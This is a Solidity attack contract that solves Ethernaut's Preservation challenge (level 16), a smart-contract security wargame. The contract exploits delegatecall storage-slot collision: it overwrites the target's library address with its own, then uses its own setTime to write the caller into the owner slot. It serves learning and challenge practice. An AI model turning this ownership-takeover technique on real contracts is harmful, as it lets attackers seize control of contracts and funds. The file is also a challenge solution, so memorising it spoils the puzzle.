// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces/IPreservation.sol";

/**
 * @title Preservation Attack (Ethernaut Challenge Level 16 - Preservation)
 * @author Emre Tepe (@emretepedev)
 * @notice Attack contract for level 16
 * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0x97E982a15FbB1C28F6B8ee971BEc15C78b3d263F
 */
contract PreservationAttack {
    address private slot0;
    address private slot1;
    uint256 private slot2;

    /*//////////////////////////////////////////////////////////////
                                Attack
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Attack and solve the level
     * @param target Address of target contract
     */
    function attack(IPreservation target) external {
        target.setFirstTime(uint256(uint160(address(this))));

        require(address(this) == target.timeZone1Library(), "Preservation: Wrong address");

        target.setFirstTime(uint256(uint160(msg.sender)));

        require(msg.sender == target.owner(), "Preservation: Attack failed");
    }

    /*//////////////////////////////////////////////////////////////
                            Helpers & Others
    //////////////////////////////////////////////////////////////*/

    /**
     * @param _time Value of the time
     */
    function setTime(uint256 _time) public {
        slot2 = _time;
    }
}
